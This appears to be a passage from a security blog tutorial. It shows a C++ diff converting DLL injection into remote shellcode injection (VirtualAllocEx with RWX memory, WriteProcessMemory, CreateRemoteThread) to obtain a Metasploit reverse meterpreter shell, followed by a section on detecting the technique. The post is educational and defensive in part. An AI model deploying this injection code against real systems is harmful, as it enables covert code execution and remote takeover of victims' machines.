+ std::cerr &lt;&lt; "Usage: " &lt;&lt; argv[0] &lt;&lt; " PID\n";
...
- LPVOID lpBuffer = VirtualAllocEx(hProcess, nullptr, 1 &lt;&lt; 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+ LPVOID lpBuffer = VirtualAllocEx(hProcess, nullptr, 1 &lt;&lt; 12, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
...
- if (!WriteProcessMemory(hProcess, lpBaseAddress, (LPCVOID)argv[2], strlen(argv[2]), nullptr)) {
+ if (!WriteProcessMemory(hProcess, lpBuffer, (LPCVOID)shellcode, 449, nullptr)) {
...
- HMODULE hKernel32 = GetModuleHandleA("Kernel32");
- if (hKernel32 == NULL) {
-   VirtualFreeEx(hProcess, lpBaseAddress, 0x0, MEM_RELEASE);
-   lpBaseAddress = nullptr;
-   CloseHandle(hProcess);
-   hProcess = NULL;
-   PrintError("GetModuleHandleA()", TRUE);
-   return 0x0;
- }
- FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
- HANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryA, lpBaseAddress, NULL, nullptr);
+ HANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, nullptr);</code></pre><p>All the changes I have shown above are explained below</p><ol><li>Write the shellcode in the memory location of the main function to access it later while writing in the remote process using WriteProcessMemory.</li><li>Allocate the page with RWX permission because the shellcode contains raw executable instructions that will be executed as soon as the thread is spawned.</li><li>Copy the contents of the shellcode into the memory of the remote process with the size of the payload retrieved from Metasploit (check the first line in the comment)</li><li>Remove all the code for getting the base address of the LoadLibraryA function and spawn the thread with the base address of the shellcode in the remote process memory. In this case, it is <code>lpBuffer</code>. </li></ol><h2 id="running-the-shellcode-exploit">Running the Shellcode Exploit</h2><p>Now you have to pass only the process id of the target process to get the reverse meterpreter shell on the attacker host. Before running the code, you can see there is only one thread (aka main thread) running in the notepad process.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://tbhaxor.com/content/images/2022/04/image-1.png" class="kg-image" alt loading="lazy" width="778" height="618" srcset="https://tbhaxor.com/content/images/size/w600/2022/04/image-1.png 600w, https://tbhaxor.com/content/images/2022/04/image-1.png 778w" sizes="(min-width: 720px) 720px"><figcaption>Before injecting into the process</figcaption></figure><p>After executing the code, there are multiple threads created in the process one of which is the one we have created via CreateRemoteThread and others are created by the second stage meterpreter shell.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://tbhaxor.com/content/images/2022/04/image-2.png" class="kg-image" alt loading="lazy" width="787" height="398" srcset="https://tbhaxor.com/content/images/size/w600/2022/04/image-2.png 600w, https://tbhaxor.com/content/images/2022/04/image-2.png 787w" sizes="(min-width: 720px) 720px"><figcaption>Thread created after launching the payload</figcaption></figure><p>In the following demonstration video, the shellcode is injected into the notepad process.</p><figure class="kg-card kg-embed-card"><iframe src="https://player.vimeo.com/video/697161697?h=63d312300e&amp;app_id=122963" width="426" height="240" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen title="Shellcode Injection via CreateRemoteThread"></iframe></figure><h1 id="how-to-detect-this-technique">How to Detect this Technique</h1><p>As I already told this is one of the oldest techniques and can be easily detected by the endpoint detection mechanisms and antiviruses. Here is a catch on how it does with common sense: Usually the process creates threads into its own context and uses <em><code>memcpy</code></em> or <em><code>strcpy</code></em> functions to perform copy operations on the memory. If a process is importing the functions, it can be retrieved from the <strong><a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table">Import Address Table</a></strong>.</p><p>So simply flag the binary as malicious if you find these functions:<em> CreateRemoteThread, OpenProcess, VirtualAllocEx </em>and<em> WriteProcessMemory</em>. Since the legit program can also use LoadLibrary to map the required DLLs on runtime, therefore this was ignored to prevent false positives. </p><p>Additionally, you can perform the Windows API hooking on the above-mentioned functions to check when they are being called. Based on the order of execution, you can then decide whether or not to flag the process and kill it.</p><h1 id="references">References</h1><ul><li><a href="http://www.nynaeve.net/?p=198">http://www.nynaeve.net/?p=198</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order</a></li><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection">https://www.ired.team/offensive-security/code-injection-process-injection/process-injection</a></li><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection</a></li><li><a href="https://tbhaxor.com/understanding-address-spacing-in-detail/">https://tbhaxor.com/understanding-address-spacing-in-detail/</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/winprog64/wow64-implementation-details">https://docs.microsoft.com/en-us/windows/win32/winprog64/wow64-implementation-details</a></li><li><a href="https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/">https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/</a></li><li><a href="https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques">https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques</a></li></ul>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post">

    <a class="post-card-image-link" href="/exploring-the-role-of-ai-in-reverse-image-search/">

        <img class="post-card-image"
            srcset="/content/images/size/w300/2024/08/Search.jpg 300w,
                    /content/images/size/w600/2024/08/Search.jpg 600w,
                    /content/images/size/w1000/2024/08/Search.jpg 1000w,
                    /content/images/size/w2000/2024/08/Search.jpg 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="/content/images/size/w600/2024/08/Search.jpg"
            alt="reverse-image-search-working-with-"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/exploring-the-role-of-ai-in-reverse-image-search/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    Exploring the Role of AI in Reverse Image Search
                </h2>
            </header>
                <div class="post-card-excerpt">Reverse image search lets users find similar images or related info by searching with an image instead of text. Tools like Google Images and TinEye analyse images to locate sources, higher resolutions, or related content.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-09-09">Sep 9, 2024</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post">

    <a class="post-card-image-link" href="/radius-aaa-server/">

        <img class="post-card-image"
            srcset="https://images.unsplash.com/photo-1712414951709-99942ecb7795?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDM5fHx8fHx8Mnx8MTcxMjc1NDU4MXw&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;300 300w,
                    https://images.unsplash.com/photo-1712414951709-99942ecb7795?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDM5fHx8fHx8Mnx8MTcxMjc1NDU4MXw&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;600 600w,
                    https://images.unsplash.com/photo-1712414951709-99942ecb7795?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDM5fHx8fHx8Mnx8MTcxMjc1NDU4MXw&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;1000 1000w,
                    https://images.unsplash.com/photo-1712414951709-99942ecb7795?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDM5fHx8fHx8Mnx8MTcxMjc1NDU4MXw&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;2000 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="https://images.unsplash.com/photo-1712414951709-99942ecb7795?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDM5fHx8fHx8Mnx8MTcxMjc1NDU4MXw&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;600"
            alt="RADIUS Server for Enterprise Networks"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/radius-aaa-server/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    RADIUS Server for Enterprise Networks
                </h2>
            </header>
                <div class="post-card-excerpt">Explore the history of RADIUS, its role in PPP, its integration with 802.1X for wireless LANs, and the use of EAP in enhancing network security.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-06-17">Jun 17, 2024</time>
                <span class="post-card-meta-length">17 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post">

    <a class="post-card-image-link" href="/enterprise-wlan-security/">

        <img class="post-card-image"
            srcset="https://images.unsplash.com/photo-1688362378019-15b0312dfce2?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDJ8fHx8fHwyfHwxNjg4OTI3NzU3fA&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;300 300w,
                    https://images.unsplash.com/photo-1688362378019-15b0312dfce2?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDJ8fHx8fHwyfHwxNjg4OTI3NzU3fA&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;600 600w,
                    https://images.unsplash.com/photo-1688362378019-15b0312dfce2?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDJ8fHx8fHwyfHwxNjg4OTI3NzU3fA&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;1000 1000w,
                    https://images.unsplash.com/photo-1688362378019-15b0312dfce2?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDJ8fHx8fHwyfHwxNjg4OTI3NzU3fA&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;2000 2000w"
            sizes="(max-width: 1000px) 400px, 800px"
            src="https://images.unsplash.com/photo-1688362378019-15b0312dfce2?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;M3wxMTc3M3wwfDF8YWxsfDJ8fHx8fHwyfHwxNjg4OTI3NzU3fA&amp;ixlib&#x3D;rb-4.0.3&amp;q&#x3D;80&amp;w&#x3D;600"
            alt="How are WLAN Infrastructures in Enterprises Secured?"
            loading="lazy"
        />


    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="/enterprise-wlan-security/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    How are WLAN Infrastructures in Enterprises Secured?
                </h2>
            </header>
                <div class="post-card-excerpt">Learn about the scalability challenges of Pre-shared (PSK) configurations in the enterprise, as well as how 802.1X addresses and resolves them elegantly.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-02-14">Feb 14, 2024</time>
                <span class="post-card-meta-length">13 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://tbhaxor.com">tbhaxor&#x27;s Blog</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous" type="f971b3148f537f1d2a2bff49-text/javascript">
</script>
<script src="/assets/built/casper.js?v=ffa7c93e5d" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script type="f971b3148f537f1d2a2bff49-text/javascript">
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script src="https://cdn.jsdelivr.net/npm/prismjs@1.24.1/prism.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-clike.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-c.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-cpp.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-python.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-bash.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-markup-templating.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-php.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-sql.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-perl.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-diff.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-nginx.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-json.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-csharp.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-yaml.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-docker.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-powershell.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/components/prism-json.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/plugins/diff-highlight/prism-diff-highlight.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="//unpkg.com/prismjs/plugins/line-highlight/prism-line-highlight.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>


<script defer src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>

<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js" integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8" crossorigin="anonymous" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" type="f971b3148f537f1d2a2bff49-text/javascript"></script>

<script type="f971b3148f537f1d2a2bff49-text/javascript">
  $(document).ready(function () {
    $(document).on("scroll", function () {
        const parallaxImage = document.querySelector('.article-image img');
        if (parallaxImage) {
            const scrollPosition = window.scrollY;
            parallaxImage.style.transform = `translateY(${scrollPosition * 0.3}px)`;
        }
    });
    
    $("pre[class*='language-']").addClass("line-numbers");
    
    renderMathInElement(document.body, {
      // customised options
      // • auto-render specific keys, e.g.:
      delimiters: [
        { left: "$$", right: "$$", display: true },
        { left: "$", right: "$", display: false },
        { left: "\\(", right: "\\)", display: false },
        { left: "\\[", right: "\\]", display: true },
      ],
      // • rendering keys, e.g.:
      throwOnError: false,
    });

    $('a[href^="http"]')
      .not('a[href*="' + window.location.hostname + '"]')
      .attr("target", "_blank");

    // add data-highlight class to the diff
    $("pre[class*='language-diff']").each(function () {
      $(this).addClass("diff-highlight");
    });

    // prepend toc bot injection
    $("section.gh-canvas").prepend("<div class='gh-toc'></div>");

    tocbot.init({
      // Where to render the table of contents.
      tocSelector: ".gh-toc",
      // Where to grab the headings to build the table of contents.
      contentSelector: ".gh-content",
      // Which headings to grab inside of the contentSelector element.
      headingSelector: "h1, h2, h3, h4",
    });

    // smooth scroll with anchor router
    $('a[href*="#"]:not([href="#"])').click(function () {
      if (location.pathname.replace(/^\//, "") == this.pathname.replace(/^\//, "") && location.hostname == this.hostname) {
        var target = $(this.hash);
        target = target.length ? target : $("[name=" + this.hash.slice(1) + "]");
        if (target.length) {
          $("html, body").animate(
            {
              scrollTop: target.offset().top,
            },
            300
          );
          return false;
        }
      }
    });
  });
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="f971b3148f537f1d2a2bff49-|49" defer></script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8f3c559a1dcccb3c',t:'MTczNDQ5NTM1NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>
